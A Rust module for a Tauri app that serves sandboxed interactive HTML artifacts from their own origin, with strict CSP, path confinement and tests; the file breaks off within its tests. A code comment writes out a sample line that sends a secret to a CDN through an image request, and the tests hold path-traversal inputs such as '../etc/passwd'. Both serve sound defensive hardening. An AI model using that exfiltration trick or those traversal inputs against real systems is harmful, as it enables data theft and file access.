//! `artifact:` custom URI scheme — the PATH B (separate-origin) interactive-artifact
//! render surface (plan `bubbly-hopping-valiant.md`, Phase 0 decision = PATH B, Phase 1).
//!
//! WHY A SEPARATE ORIGIN: the app page CSP is `script-src 'self'` (`tauri.conf.json`). A
//! `srcdoc` document INHERITS that CSP, so an artifact's inline `<script>` would be blocked
//! (a `<meta>` CSP can only TIGHTEN, never loosen). Serving the artifact from its OWN origin
//! (`artifact://localhost/...` on macOS/Linux, `http://artifact.localhost/...` on Windows)
//! with its OWN CSP **response header** bypasses host-CSP inheritance entirely — the
//! Claude.ai model. The hosting `<iframe sandbox="allow-scripts">` (NO `allow-same-origin`)
//! keeps the document on an OPAQUE origin: it cannot read `window.parent`, cannot reach
//! `__TAURI_INTERNALS__`/IPC, and `connect-src 'none'` blocks every fetch/XHR/WS/beacon, so
//! the artifact can run real JS (and load CDN libraries) yet exfiltrate nothing.
//!
//! ROUTING (by request path; the path's only caller-supplied component is the id, used SOLELY
//! as a registry lookup key — never as a filesystem path segment):
//!   - `/spike` | `/__spike__` — the throwaway Phase-0 A-vs-B test doc (keeps the owner's live
//!     e2e working). Self-reports the three isolation checks; served as-is (no bridge).
//!   - `/__sample__` — a hardcoded known-good INTERACTIVE sample (clickable counter that grows
//!     the body to exercise resize + a cdnjs library load + a `connect-src` proof). Served
//!     through the SAME bridge-injection path as a real artifact so Phase 1 is testable on its
//!     own, independent of Phase 2's generation pipeline.
//!   - `/<id>` — a STORED artifact: resolves the design id through the design registry to its
//!     working folder, then serves `<workingFolder>/artifact/index.html`, path-confined.
//!
//! PATH CONFINEMENT (the #1 requirement) — three independent layers, any one of which alone
//! prevents traversal:
//!   1. [`validate_artifact_id`] rejects every traversal-relevant character (`/`, `\`, `.`,
//!      control/NUL, over-length) BEFORE the id is used at all.
//!   2. The id is only ever an EXACT-MATCH lookup key into the design registry
//!      ([`design::registry_working_folder_for_id`]); it never becomes a path segment, so it
//!      cannot inject `..`. An unknown id resolves to `None` → 404.
//!   3. The served file path is built from the registry's own (canonicalized) working folder
//!      via [`design::canonical_working_folder`] joined with the FIXED `artifact/index.html`
//!      and re-confined by [`confined_artifact_index`] (lexical parent check + symlink-escape
//!      check against the canonical root). There is NO caller-supplied filename component.
//!
//! The bridge script (resize/ready/error → `postMessage(…, '*')`) is OUR authored ~500B
//! zero-dep snippet, injected here when serving so it works regardless of model quality. The
//! injection is marker-guarded so a Phase-2 pipeline that injects at generation time is not
//! double-bridged.

use std::fs;
use std::path::{Path, PathBuf};
use tauri::http::{header, Request, Response};
use tauri::{UriSchemeContext, Wry};

use super::design;

/// The CDN allowlist the artifact CSP grants (script/style/img/font). Mirrors Claude.ai:
/// artifacts CAN load known libraries (React/Tailwind/charting) from these origins, but
/// `connect-src 'none'` still blocks ALL fetch/XHR/WebSocket/beacon, so no data leaves the
/// device. Factored into one place so the allowlist is auditable and configurable.
///
/// KEEP IN SYNC with `src/components/design/generation/interactivePipeline.ts`'s
/// `ARTIFACT_CDN_ALLOWLIST` (the TS side decides which remote refs to KEEP vs neutralize).
/// The two lists MUST be identical or artifacts silently break; each side is pinned to the
/// exact three origins by a test (`cdn_allowlist_is_exactly_the_three_expected_origins` here
/// and the matching vitest), so any change trips that test and forces mirroring the other.
const ARTIFACT_CDN_ALLOWLIST: &str =
    "https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://unpkg.com";

/// Build the artifact document's CSP (served as a RESPONSE HEADER — we own the origin, so we
/// own the header; `<meta>` is not needed and could only tighten). `'unsafe-inline'` /
/// `'unsafe-eval'` are safe ONLY because the doc lives on an opaque, IPC-less origin and
/// cannot exfiltrate (`connect-src 'none'`). Built from [`ARTIFACT_CDN_ALLOWLIST`] so the
/// allowlist appears once. Cheap to build per request (a render handler is not hot-path).
///
/// SECURITY: `img-src` and `font-src` intentionally carry ONLY `data:` — omitting the CDN
/// origins closes a silent exfiltration channel: an artifact could issue
/// `new Image().src = "https://unpkg.com/?d=" + btoa(secret)` or a CSS `@font-face` URL
/// that encodes data in the query string; the CDN's access logs would capture it even though
/// `connect-src 'none'` does not cover img/font fetches. Libraries still load via
/// `script-src` and `style-src` (unchanged).
///
/// RESIDUAL (documented, no mitigation): WebRTC (`RTCPeerConnection`) is NOT governed by CSP
/// `connect-src` and the WebView exposes no flag to disable it, so a determined artifact could
/// in principle open a data channel. Accepted residual risk — there is no WebView-level lever
/// to close it here; the `<iframe sandbox>` opaque origin + IPC isolation remain the boundary.
fn artifact_csp() -> String {
    let cdn = ARTIFACT_CDN_ALLOWLIST;
    format!(
        "default-src 'none'; \
         script-src 'unsafe-inline' 'unsafe-eval' {cdn}; \
         style-src 'unsafe-inline' {cdn}; \
         img-src data:; \
         font-src data:; \
         connect-src 'none'; form-action 'none'; base-uri 'none'; frame-ancestors 'self';"
    )
}

/// Subdirectory (under a design's working folder) that holds the interactive artifact, and
/// the fixed entry filename. Both are CONSTANTS — there is no caller-supplied path component,
/// so the served path has no traversal surface (mirrors `design_preview`'s fixed-name posture).
///
/// `ARTIFACT_DIR` is `pub(crate)` so the sibling `design` module creates/ confines the SAME
/// `<workingFolder>/artifact` directory before the Phase-2 writer drops `index.html` there —
/// one source of truth for the folder name shared by the reader (here) and the writer (there).
pub(crate) const ARTIFACT_DIR: &str = "artifact";
const ARTIFACT_INDEX_FILE: &str = "index.html";

/// Marker embedded in [`ARTIFACT_BRIDGE`] — present in the `ARTIFACT_BRIDGE_GUARD` string and
/// used in test assertions. NOT used for the idempotency check (see `ARTIFACT_BRIDGE_GUARD`
/// below). `#[allow(dead_code)]` because references exist only in `#[cfg(test)]` blocks.
#[allow(dead_code)]
const ARTIFACT_BRIDGE_MARKER: &str = "__artifact_bridge_v1__";

/// Guard string used by [`inject_bridge`] to detect prior injection. This is the EXACT prefix
/// that `ARTIFACT_BRIDGE` starts with — a substring that ONLY appears when the real bridge was
/// injected. Using the full `<script>/*__artifact_bridge_v1__*/` prefix (rather than the bare
/// marker) closes a bypass: an artifact that contains `__artifact_bridge_v1__` inside a comment
/// or data attribute would otherwise suppress bridge injection entirely.
const ARTIFACT_BRIDGE_GUARD: &str = "<script>/*__artifact_bridge_v1__*/";

/// OUR authored bridge (zero-dep, ~500B). Forwards layout height (`artifact:resize`), a single
/// `artifact:ready`, and uncaught errors (`artifact:error`) to the parent via
/// `postMessage(…, '*')`. The target MUST be `'*'` — a custom-scheme target throws
/// `SyntaxError: Invalid target origin` in WebView2. Injected by the handler so resize/error
/// work for ANY artifact (graceful degradation regardless of the generating model's quality).
///
/// SECURITY (defense-in-depth): the bridge also carries two `<head>`-level metas that close
/// exfiltration channels CSP `connect-src 'none'` does NOT govern. CSP3 explicitly carves out
/// `<link rel="dns-prefetch">`, so a malicious artifact could encode stolen bytes into a DNS
/// hostname; `x-dns-prefetch-control: off` disables that speculative lookup. `referrer:
/// no-referrer` stops the document origin/path from leaking on any outbound navigation. They
/// sit AFTER the guard-bearing `</script>` so `ARTIFACT_BRIDGE_GUARD` stays the exact prefix
/// of this constant (the idempotency check + its prefix test are unaffected) yet are still
/// inside `<head>` when injected before `</head>` (the dominant serve path).
const ARTIFACT_BRIDGE: &str = "<script>/*__artifact_bridge_v1__*/(function(){\
function h(){return Math.max(\
document.documentElement?document.documentElement.scrollHeight:0,\
document.body?document.body.scrollHeight:0);}\
function send(m){try{parent.postMessage(m,'*');}catch(e){}}\
function report(){send({type:'artifact:resize',height:h()});}\
var readied=false;\
function ready(){if(!readied){readied=true;send({type:'artifact:ready'});}}\
window.addEventListener('DOMContentLoaded',function(){\
ready();report();\
if(window.ResizeObserver&&document.body){try{new ResizeObserver(report).observe(document.body);}catch(e){}}});\
window.addEventListener('load',report);\
window.addEventListener('error',function(e){send({type:'artifact:error',message:String((e&&e.message)||e)});});\
window.addEventListener('unhandledrejection',function(e){send({type:'artifact:error',message:'Unhandled: '+String(e&&e.reason)});});\
})();</script>\
<meta http-equiv=\"x-dns-prefetch-control\" content=\"off\">\
<meta name=\"referrer\" content=\"no-referrer\">";

/// Minimal 404 body. Carries no path/detail (never leaks the filesystem layout).
const NOT_FOUND_DOC: &str =
    "<!DOCTYPE html><html><head><meta charset=\"utf-8\"></head><body>Artifact not found.</body></html>";

/// The throwaway Phase-0 A-vs-B test doc (PATH B side). Self-reports the three isolation
/// checks to the spike panel via `postMessage({t:'spike', …}, '*')`. Kept VERBATIM from the
/// Phase-0 spike so the owner's existing live e2e keeps working. Served as-is (no bridge).
const SPIKE_DOC: &str = r#"<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Artifact spike — PATH B</title>
  <style>
    body { font: 13px system-ui, sans-serif; margin: 0; padding: 12px; color: #1b1721; }
    code { font-family: ui-monospace, monospace; }
  </style>
</head>
<body>
  <p>PATH B artifact (separate origin, own CSP). Inline script executed if you read this with a check mark in the host table.</p>
  <script>
    (function () {
      function send(payload) {
        try { parent.postMessage(payload, '*'); } catch (e) { /* nothing we can do */ }
      }
      var ipcUnreachable;
      try {
        var probe = window.parent.__TAURI_INTERNALS__;
        var url = window.parent.location.href;
        ipcUnreachable = (probe === undefined && url === undefined);
      } catch (e) {
        ipcUnreachable = true;
      }
      function finish(fetchBlocked, note) {
        send({ t: 'spike', path: 'B', ok: true, fetchBlocked: fetchBlocked, ipcUnreachable: ipcUnreachable, note: note });
      }
      try {
        fetch('https://example.com', { mode: 'no-cors' }).then(function () {
          finish(false, 'fetch resolved (NOT blocked)');
        }).catch(function (err) {
          finish(true, 'fetch rejected: ' + String(err && err.message || err));
        });
      } catch (e) {
        finish(true, 'fetch threw: ' + String(e && e.message || e));
      }
    })();
  </script>
</body>
</html>
"#;

/// Hardcoded known-good INTERACTIVE sample (Phase 1, dev route `/__sample__`). Self-contained;
/// carries NO CSP `<meta>` (the response header provides it) and NO bridge (the handler injects
/// it) so this doc exercises the REAL serve path. Demonstrates: a clickable counter that appends
/// list rows (growing the body → `artifact:resize`), a cdnjs library load (proves the CDN
/// allowlist), and a `fetch` that must be blocked (proves `connect-src 'none'`). Uses
/// `addEventListener` only — no inline `on*=` handlers.
const SAMPLE_DOC: &str = r#"<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Interactive artifact sample</title>
  <style>
    :root { color-scheme: light; }
    body { font: 14px system-ui, sans-serif; margin: 0; padding: 20px; color: #1b1721; background: #fffdf8; }
    h1 { font-size: 18px; margin: 0 0 10px; }
    p { margin: 0 0 12px; }
    button { font: inherit; padding: 8px 14px; border-radius: 8px; border: 1px solid #d8cfbe; background: #f4f1ea; cursor: pointer; }
    button:hover { background: #ece7db; }
    .count { font-weight: 700; font-variant-numeric: tabular-nums; }
    ul { margin: 12px 0 0; padding-left: 18px; }
    .status { margin-top: 14px; font-size: 12px; color: #555; line-height: 1.7; }
    .ok { color: #137a3f; font-weight: 600; }
    .bad { color: #c0392b; font-weight: 600; }
    code { font-family: ui-monospace, monospace; }
  </style>
</head>
<body>
  <h1>Interactive artifact sample (PATH B)</h1>
  <p>Self-contained interactive document served from the <code>artifact:</code> origin with its own CSP. Real JS runs inside the sandbox.</p>
  <p><button id="inc" type="button">Clicked <span class="count" id="count">0</span> times</button></p>
  <ul id="log"></ul>
  <div class="status">
    CDN library (cdnjs &middot; dayjs): <span id="cdn">loading&hellip;</span><br />
    Network <code>fetch</code> (must be blocked by <code>connect-src 'none'</code>): <span id="net">testing&hellip;</span>
  </div>

  <script>
    (function () {
      var n = 0;
      var countEl = document.getElementById('count');
      var logEl = document.getElementById('log');
      document.getElementById('inc').addEventListener('click', function () {
        n += 1;
        countEl.textContent = String(n);
        var li = document.createElement('li');
        li.textContent = 'click #' + n + ' at ' + new Date().toLocaleTimeString();
        logEl.appendChild(li); // grows the body height -> exercises artifact:resize
      });

      // CDN check: load dayjs from the cdnjs allowlist entry (onload via DOM property, not an
      // inline attribute). onload => the CDN allowlist works; onerror => offline/blocked.
      var cdnEl = document.getElementById('cdn');
      var s = document.createElement('script');
      s.src = 'https://cdnjs.cloudflare.com/ajax/libs/dayjs/1.11.10/dayjs.min.js';
      s.onload = function () {
        try {
          cdnEl.textContent = 'loaded — dayjs() = ' + window.dayjs().format('YYYY-MM-DD HH:mm:ss');
          cdnEl.className = 'ok';
        } catch (e) { cdnEl.textContent = 'loaded'; cdnEl.className = 'ok'; }
      };
      s.onerror = function () { cdnEl.textContent = 'not loaded (offline or blocked)'; cdnEl.className = 'bad'; };
      document.head.appendChild(s);

      // connect-src 'none' proof: any fetch must fail. We EXPECT the rejection (caught, so no
      // uncaught error reaches the bridge's error channel).
      var netEl = document.getElementById('net');
      try {
        fetch('https://example.com', { mode: 'no-cors' }).then(function () {
          netEl.textContent = 'NOT blocked (unexpected!)'; netEl.className = 'bad';
        }).catch(function () {
          netEl.textContent = 'blocked (good)'; netEl.className = 'ok';
        });
      } catch (e) { netEl.textContent = 'blocked (good)'; netEl.className = 'ok'; }
    })();
  </script>
</body>
</html>
"#;

// ---------------------------------------------------------------------------
// PURE helpers (unit-testable without a Tauri app / filesystem)
// ---------------------------------------------------------------------------

/// First line of path confinement: validate the request's id segment. Rejects EVERY
/// traversal-relevant character — `/`, `\`, `.` (so `..` and dotfiles can never appear),
/// control/NUL — plus empty/over-long ids, BEFORE the id is used. The accepted charset
/// `[A-Za-z0-9_-]` is a strict superset of `new_project_id()`'s output (`p<pid>-<micros>`).
/// Even a charset-valid id is harmless: it is only an exact-match registry KEY, never a path
/// segment (see module docs), so this is defense-in-depth, not the sole boundary.
///
/// `pub(crate)` so `design::design_registry_remember` can validate a frontend-supplied id
/// before persisting it (validate-at-write principle).
pub(crate) fn validate_artifact_id(id: &str) -> Result<(), String> {
    if id.is_empty() {
        return Err("artifact id must not be empty".to_string());
    }
    if id.len() > 128 {
        return Err("artifact id is too long".to_string());
    }
    if !id
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
    {
        return Err("artifact id contains an invalid character".to_string());
    }
    Ok(())
}

/// Resolve the confined `artifact/index.html` path under an ALREADY-CANONICAL working folder.
/// The filename is a FIXED constant (no caller input), so there is no traversal surface; the
/// guards are belt-and-suspenders mirroring `design::confined_component_path`:
///   - LEXICAL: the target's parent must be the `artifact` dir (always holds for the fixed
///     name; catches a future change to the constant).
///   - SYMLINK: when the target exists, its fully-resolved real path must stay under the
///     canonical ROOT — this defeats BOTH `artifact/` being a symlink to off-root AND
///     `index.html` being such a symlink (the root is already real, so a prefix check is sound).
///
/// `pub(crate)` so the Phase-2 writer (`design::design_write_artifact`) resolves the EXACT
/// SAME confined path it will later be served from — no second, divergent path derivation.
pub(crate) fn confined_artifact_index(canonical_root: &Path) -> Result<PathBuf, String> {
    let artifact_dir = canonical_root.join(ARTIFACT_DIR);
    let target = artifact_dir.join(ARTIFACT_INDEX_FILE);

    if target.parent() != Some(artifact_dir.as_path()) {
        return Err("artifact path escapes the artifact folder".to_string());
    }

    if target.exists() {
        let real = fs::canonicalize(&target)
            .map_err(|_| "could not resolve the artifact path".to_string())?;
        if !real.starts_with(canonical_root) {
            return Err("artifact path escapes the working folder".to_string());
        }
    }
    Ok(target)
}

/// Case-insensitive byte-offset find of an ASCII `needle_lower` (already lowercase). Safe to
/// index the ORIGINAL string at the returned offset: `to_ascii_lowercase` preserves byte
/// length and only rewrites ASCII bytes, so the offset is a valid char boundary and the
/// needle is ASCII (matches the same bytes in the original).
fn find_ci(haystack: &str, needle_lower: &str) -> Option<usize> {
    haystack.to_ascii_lowercase().find(needle_lower)
}

/// Inject the bridge script into a served document. Idempotent: a doc already carrying the
/// bridge (`ARTIFACT_BRIDGE_GUARD` present — i.e. the exact `<script>/*__artifact_bridge_v1__*/`
/// prefix) is returned unchanged (so a future generation-time injection is not double-bridged).
/// Using the full script-prefix guard instead of the bare marker prevents an artifact that
/// contains the marker string only inside a comment/attribute from bypassing injection.
/// Insertion point, in order of preference: just before `</head>`, else before `</body>`, else
/// prepended (a fragment without a full document shell still gets it).
fn inject_bridge(html: &str) -> String {
    // Case-INSENSITIVE guard: an artifact carrying `<SCRIPT>/*__artifact_bridge_v1__*/`
    // (uppercase tag) would evade a byte-exact check and get a SECOND bridge. The guard
    // constant is already lowercase, so `.to_ascii_lowercase()` on it is a no-op, but kept
    // explicit so a future edit introducing uppercase still matches. Reuses `find_ci`,
    // which lowercases the haystack and searches for the already-lowercase needle.
    if find_ci(html, &ARTIFACT_BRIDGE_GUARD.to_ascii_lowercase()).is_some() {
        return html.to_string();
    }
    let at = find_ci(html, "</head>").or_else(|| find_ci(html, "</body>"));
    let mut out = String::with_capacity(html.len() + ARTIFACT_BRIDGE.len());
    match at {
        Some(i) => {
            out.push_str(&html[..i]);
            out.push_str(ARTIFACT_BRIDGE);
            out.push_str(&html[i..]);
        }
        None => {
            out.push_str(ARTIFACT_BRIDGE);
            out.push_str(html);
        }
    }
    out
}

// ---------------------------------------------------------------------------
// Serve path (touches the registry + filesystem)
// ---------------------------------------------------------------------------

/// Map a design `id` to its stored, bridge-injected `index.html`, fully path-confined. Errors
/// are STABLE short labels with no filesystem detail (never leak the layout to the webview).
/// An unknown id, a missing/oversize/unreadable file, or a confinement violation all surface
/// as an `Err`, which the handler turns into a 404.
fn serve_stored_artifact(app: &tauri::AppHandle, id: &str) -> Result<String, String> {
    validate_artifact_id(id)?;
    let working_folder = design::registry_working_folder_for_id(app, id)
        .ok_or_else(|| "unknown artifact id".to_string())?;
    let canonical = design::canonical_working_folder(&working_folder)?;
    let target = confined_artifact_index(&canonical)?;

    // TOCTOU defence (race-resistant 3-step sequence): canonicalize FIRST to establish the
    // ONE real path used for ALL subsequent operations, THEN do the prefix check, the size
    // cap, and the read on that SAME `real` path.  `confined_artifact_index` only
    // canonicalizes `target` when it already existed at check time, so a symlink raced in
    // afterwards could otherwise resolve to an off-root file.  The previous code diverged:
    // it size-checked and read `target` (unverified) while only the prefix check used `real`,
    // so a symlink swapped in after the check could (a) escape the root on read and (b) be
    // read uncapped if it was swapped to a multi-GB file after the metadata call.  Resolving
    // once and operating only on `real` removes that divergence.  A residual sub-millisecond
    // window remains between `metadata(&real)` and `read(&real)`, but both touch `real`,
    // never `target`, so a swap can no longer escape the root nor be read uncapped.  Mirrors
    // `design::confined_component_path`'s TOCTOU note.  On any failure we return the same
    // stable 404 (never leak filesystem detail).
    let real = fs::canonicalize(&target).map_err(|_| "artifact not found".to_string())?;
    if !real.starts_with(&canonical) {
        return Err("artifact not found".to_string());
    }
    let meta = fs::metadata(&real).map_err(|_| "artifact not found".to_string())?;
    if meta.len() > design::max_design_file_bytes() {
        return Err("artifact is too large".to_string());
    }
    let raw = fs::read_to_string(&real).map_err(|_| "artifact is unreadable".to_string())?;
    Ok(inject_bridge(&raw))
}

/// Build an HTML response carrying the artifact CSP header (+ nosniff + no-store so a freshly
/// regenerated artifact is never served stale). The body bytes can never fail to build and
/// every header value is ASCII-constant, so `.expect` here is a documented invariant, not a
/// load-bearing panic.
fn respond_html(status: u16, html: &str) -> Response<Vec<u8>> {
    Response::builder()
        .status(status)
        .header(header::CONTENT_TYPE, "text/html; charset=utf-8")
        .header("Content-Security-Policy", artifact_csp())
        // Belt-and-suspenders: never let this doc be sniffed into another type.
        .header("X-Content-Type-Options", "nosniff")
        .header(header::CACHE_CONTROL, "no-store")
        .body(html.as_bytes().to_vec())
        .expect("artifact_protocol: HTML response with ASCII headers always builds")
}

/// GET handler for the `artifact:` scheme (concrete over `Wry` — the registry resolver needs a
/// `&AppHandle<Wry>`; the builder's runtime is `Wry`). Routes by the request path (see module
/// docs). Reads NO request body. Every failure path falls through to a detail-free 404.
pub fn handle_artifact_request(
    ctx: UriSchemeContext<'_, Wry>,
    request: Request<Vec<u8>>,
) -> Response<Vec<u8>> {
    let path = request.uri().path();
    // The id (or reserved route) is the single path segment; trim the surrounding slashes.
    // Any interior `/` survives and fails both the reserved-route match and id validation.
    let route = path.trim_matches('/');
    match route {
        "spike" | "__spike__" => respond_html(200, SPIKE_DOC),
        "__sample__" => respond_html(200, &inject_bridge(SAMPLE_DOC)),
        id => match serve_stored_artifact(ctx.app_handle(), id) {
            Ok(html) => respond_html(200, &html),
            Err(_) => respond_html(404, NOT_FOUND_DOC),
        },
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ---- CSP --------------------------------------------------------------

    #[test]
    fn csp_has_cdn_allowlist_and_blocks_network() {
        let csp = artifact_csp();
        assert!(csp.contains("default-src 'none'"), "{csp}");
        assert!(csp.contains("connect-src 'none'"), "{csp}");
        assert!(csp.contains("script-src 'unsafe-inline' 'unsafe-eval'"), "{csp}");
        assert!(csp.contains("base-uri 'none'"), "{csp}");
        assert!(csp.contains("frame-ancestors 'self'"), "{csp}");

        // The owner-approved CDN allowlist MUST appear in script-src and style-src so
        // libraries can load, but MUST NOT appear in img-src or font-src (those are
        // exfiltration channels that connect-src 'none' does not cover).
        let cdn_origins = [
            "https://cdnjs.cloudflare.com",
            "https://cdn.jsdelivr.net",
            "https://unpkg.com",
        ];
        // Split on ';' so we can test individual directives without overlap.
        let directives: Vec<&str> = csp.split(';').map(str::trim).collect();
        let script_src = directives.iter().find(|d| d.starts_with("script-src")).copied().unwrap_or("");
        let style_src  = directives.iter().find(|d| d.starts_with("style-src")).copied().unwrap_or("");
        let img_src    = directives.iter().find(|d| d.starts_with("img-src")).copied().unwrap_or("");
        let font_src   = directives.iter().find(|d| d.starts_with("font-src")).copied().unwrap_or("");

        for cdn in cdn_origins {
            assert!(script_src.contains(cdn), "script-src must contain CDN {cdn}: {csp}");
            assert!(style_src.contains(cdn),  "style-src must contain CDN {cdn}: {csp}");
            // Closed exfiltration channels: CDN must NOT appear here.
            assert!(!img_src.contains(cdn),   "img-src must NOT contain CDN {cdn} (exfil channel): {csp}");
            assert!(!font_src.contains(cdn),  "font-src must NOT contain CDN {cdn} (exfil channel): {csp}");
        }
        // data: URIs (inline images/fonts in stylesheets) are still permitted.
        assert!(img_src.contains("data:"),  "img-src must keep data: for inline images: {csp}");
        assert!(font_src.contains("data:"), "font-src must keep data: for inline fonts: {csp}");
    }

    #[test]
    fn cdn_allowlist_is_exactly_the_three_expected_origins() {
        // KEEP IN SYNC with interactivePipeline.ts's ARTIFACT_CDN_ALLOWLIST (and its vitest
        // twin). Pinning to the EXACT set means any intentional change trips this test,
        // forcing a conscious update here AND a mirrored edit on the TS side.
        let origins: Vec<&str> = ARTIFACT_CDN_ALLOWLIST.split_whitespace().collect();
        assert_eq!(
            origins,
            vec![
                "https://cdnjs.cloudflare.com",
                "https://cdn.jsdelivr.net",
                "https://unpkg.com",
            ],
            "Rust ARTIFACT_CDN_ALLOWLIST drifted — mirror the change in interactivePipeline.ts"
        );
    }

    // ---- id validation (confinement layer 1) ------------------------------

    #[test]
    fn validate_artifact_id_rejects_traversal_and_junk() {
        for bad in [
            "",
            "..",
            "../etc/passwd",
            "a/b",
            "a\\b",
            ".hidden",
            "p1.2",        // '.' is rejected outright (kills `..` and dotfiles)
            "/abs",
            "p1 2",        // space
            "p1\0",        // NUL
            "p1\n",        // control
            &"a".repeat(129),
        ] {
            assert!(
                validate_artifact_id(bad).is_err(),
                "should reject id {bad:?}"
            );
        }
    }

    #[test]
    fn validate_artifact_id_accepts_real_ids() {
        for ok in ["p12345-1700000000000000", "p1-2", "abc_DEF-123", "a"] {
            assert!(validate_artifact_id(ok).is_ok(), "should accept id {ok:?}");
        }
    }

    // ---- path confinement (confinement layer 3) ---------------------------

    #[test]
    fn confined_artifact_index_stays_under_root() {
        let root = std::env::temp_dir();
        let p = confined_artifact_index(&root).unwrap();
        assert_eq!(p.file_name().unwrap(), "index.html");
        assert_eq!(p.parent().unwrap(), root.join(ARTIFACT_DIR).as_path());
    }

    #[test]
    fn confined_artifact_index_resolves_existing_file() {
        // A real `<root>/artifact/index.html` must resolve to exactly that file (the happy
        // "a valid id serves the file" path, minus the registry/app layer which is exercised
        // live + covered by design.rs's own registry tests).
        let base = std::env::temp_dir().join(format!(
            "aspis-artifact-test-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        let art = base.join(ARTIFACT_DIR);
        fs::create_dir_all(&art).unwrap();
        fs::write(art.join(ARTIFACT_INDEX_FILE), "<!DOCTYPE html><body>hi</body>").unwrap();
        // Canonicalize the root (macOS temp dir is itself a symlink) before confining.
        let canonical = fs::canonicalize(&base).unwrap();
        let resolved = confined_artifact_index(&canonical).unwrap();
        assert!(resolved.exists());
        assert!(resolved.starts_with(&canonical));
        let body = fs::read_to_string(&resolved).unwrap();
        assert!(body.contains("hi"));
        let _ = fs::remove_dir_all(&base);
    }

    #[cfg(unix)]
    #[test]
    fn confined_artifact_index_rejects_symlink_escape() {
        use std::os::unix::fs::symlink;
        let uniq = format!(
            "{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        );
        let base = std::env::temp_dir().join(format!("aspis-artifact-root-{uniq}"));
        let outside = std::env::temp_dir().join(format!("aspis-artifact-outside-{uniq}"));
        fs::create_dir_all(&base).unwrap();
        fs::create_dir_all(&outside).unwrap();
        fs::write(outside.join(ARTIFACT_INDEX_FILE), "<body>escaped</body>").unwrap();
        let canonical_root = fs::canonicalize(&base).unwrap();
        let canonical_outside = fs::canonicalize(&outside).unwrap();
        // Plant `artifact` as a symlink pointing OUT of the working folder.
        symlink(&canonical_outside, canonical_root.join(ARTIFACT_DIR)).unwrap();

        let err = confined_artifact_index(&canonical_root)
            .expect_err("a symlinked artifact dir pointing off-root must be rejected");
        assert!(err.contains("escapes"), "unexpected error: {err}");

        let _ = fs::remove_file(canonical_root.join(ARTIFACT_DIR));
        let _ = fs::remove_dir_all(&base);
        let _ = fs::remove_dir_all(&outside);
    }

    // ---- bridge injection -------------------------------------------------

    #[test]
    fn inject_bridge_inserts_once_before_head() {
        let doc = "<!DOCTYPE html><html><head><title>t</title></head><body>x</body></html>";
        let out = inject_bridge(doc);
        assert!(out.contains(ARTIFACT_BRIDGE_MARKER), "bridge not injected: {out}");
        // Injected BEFORE </head>.
        let bridge_at = out.find(ARTIFACT_BRIDGE_MARKER).unwrap();
        let head_close = out.find("</head>").unwrap();
        assert!(bridge_at < head_close, "bridge must precede </head>");
        // Idempotent: a second pass does not add a second copy.
        let twice = inject_bridge(&out);
        assert_eq!(
            twice.matches(ARTIFACT_BRIDGE_MARKER).count(),
            1,
            "bridge must not be injected twice"
        );
    }

    #[test]
    fn inject_bridge_guard_is_prefix_of_bridge_constant() {
        // Invariant: ARTIFACT_BRIDGE_GUARD must be the exact opening of ARTIFACT_BRIDGE so the
        // idempotency check fires correctly on real injections and only on them.
        assert!(
            ARTIFACT_BRIDGE.starts_with(ARTIFACT_BRIDGE_GUARD),
            "ARTIFACT_BRIDGE_GUARD must be a prefix of ARTIFACT_BRIDGE"
        );
    }

    #[test]
    fn inject_bridge_bare_marker_in_comment_still_gets_bridge() {
        // A document that contains the BARE marker string (e.g. inside an HTML comment or a
        // data attribute) but NOT the full guard prefix must still receive the bridge.
        // This closes the bypass: only the full `<script>/*__artifact_bridge_v1__*/` prefix
        // (which appears only in a real prior injection) should suppress injection.
        let doc_with_comment = format!(
            "<!DOCTYPE html><html><head></head><body><!-- {} --></body></html>",
            ARTIFACT_BRIDGE_MARKER
        );
        let out = inject_bridge(&doc_with_comment);
        // The bridge MUST have been injected (guard not present before injection).
        assert!(
            out.contains(ARTIFACT_BRIDGE_GUARD),
            "bridge must be injected even when bare marker appears in a comment: {out}"
        );
        // The marker now appears twice: once in our injected bridge, once in the comment.
        assert_eq!(
            out.matches(ARTIFACT_BRIDGE_MARKER).count(),
            2,
            "marker should appear once in bridge + once in original comment"
        );
    }

    #[test]
    fn inject_bridge_uppercase_marker_is_not_double_bridged() {
        // An artifact already carrying the bridge but with an UPPERCASE `<SCRIPT>` tag must
        // NOT receive a second bridge — the idempotency guard is matched case-insensitively.
        let upper_marker = ARTIFACT_BRIDGE_GUARD.to_ascii_uppercase(); // <SCRIPT>/*__ARTIFACT_BRIDGE_V1__*/
        let doc = format!(
            "<!DOCTYPE html><html><head>{upper_marker}/* prior */</script></head><body>x</body></html>"
        );
        let out = inject_bridge(&doc);
        // Returned unchanged: no lowercase guard/bridge was appended.
        assert_eq!(out, doc, "uppercase marker must suppress a second injection");
        assert!(
            !out.contains(ARTIFACT_BRIDGE_GUARD),
            "no lowercase bridge guard should have been added: {out}"
        );
    }

    #[test]
    fn inject_bridge_falls_back_to_body_then_prepend() {
        // No </head> → before </body>.
        let body_only = "<html><body>only body</body></html>";
        let out = inject_bridge(body_only);
        assert!(out.find(ARTIFACT_BRIDGE_MARKER).unwrap() < out.find("</body>").unwrap());
        // No head/body shell → prepended.
        let fragment = "<div>just a fragment</div>";
        let pre = inject_bridge(fragment);
        assert!(pre.starts_with("<script>"), "fragment must be prepended: {pre}");
        assert!(pre.ends_with("<div>just a fragment</div>"));
    }

    #[test]
    fn inject_bridge_is_case_insensitive_for_head() {
        let upper = "<HTML><HEAD></HEAD><BODY>x</BODY></HTML>";
        let out = inject_bridge(upper);
        assert!(out.find(ARTIFACT_BRIDGE_MARKER).unwrap() < out.to_ascii_lowercase().find("</head>").unwrap());
    }

    // ---- bridge contract --------------------------------------------------

    #[test]
    fn bridge_targets_wildcard_and_emits_the_three_types() {
        assert!(ARTIFACT_BRIDGE.contains("'*'"), "postMessage target must be '*'");
        assert!(ARTIFACT_BRIDGE.contains("artifact:ready"));
        assert!(ARTIFACT_BRIDGE.contains("artifact:resize"));
        assert!(ARTIFACT_BRIDGE.contains("artifact:error"));
